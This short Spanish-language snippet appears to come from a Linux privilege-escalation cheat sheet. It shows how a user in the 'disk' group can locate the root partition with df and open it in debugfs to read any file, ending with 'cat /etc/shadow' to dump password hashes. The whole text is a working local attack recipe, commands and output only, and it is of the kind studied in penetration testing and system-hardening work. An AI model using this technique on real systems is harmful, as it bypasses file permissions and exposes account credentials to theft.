## disk
```sh
## Si el usuario está el grupo disk, podemos leer archivos arbitrarios
victim@machine:~$ df -h  
S.ficheros     Tamaño Usados  Disp Uso% Montado en  
/dev/sda1         19G   2,3G   16G  14% /    ## Identificamos donde esta montada la raíz
victim@machine:~$ debugfs /dev/sda1  ## Debugeamos ese FS aprovechando los privilegios
debugfs 1.47.0 (5-Feb-2023)  
debugfs:  cat /etc/shadow  
...
```
